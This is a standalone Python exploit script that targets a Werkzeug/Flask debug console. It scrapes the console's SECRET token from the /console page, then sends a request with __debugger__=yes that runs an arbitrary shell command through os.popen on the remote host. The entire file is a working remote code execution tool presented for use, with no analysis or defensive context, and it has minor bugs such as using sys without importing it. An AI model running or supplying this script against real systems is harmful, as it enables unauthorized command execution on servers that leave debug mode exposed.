#!/usr/bin/env python

import requests
import re
import urllib

hostname = input('Enter the URL hostname: ')
command = input('Enter the command: ')

response = requests.get('http://%s/console' % (hostname))
cmd = '''__import__('os').popen(\'%s\').read();''' % (command)
secret = re.findall("[0-9a-zA-Z]{20}", response.text)

if len(secret) != 1:
    print("[-] Couldn't get the SECRET")
    sys.exit(-1)
else:
    secret = secret[0]
    print("[+] SECRET is: "+str(secret))

response = requests.get("http://%s/console?__debugger__=yes&cmd=%s&frm=0&s=%s" % (hostname,str(cmd),secret))

print("[+] response from server")
print("status code: " + str(response.status_code))
print("response: "+ str(response.text))
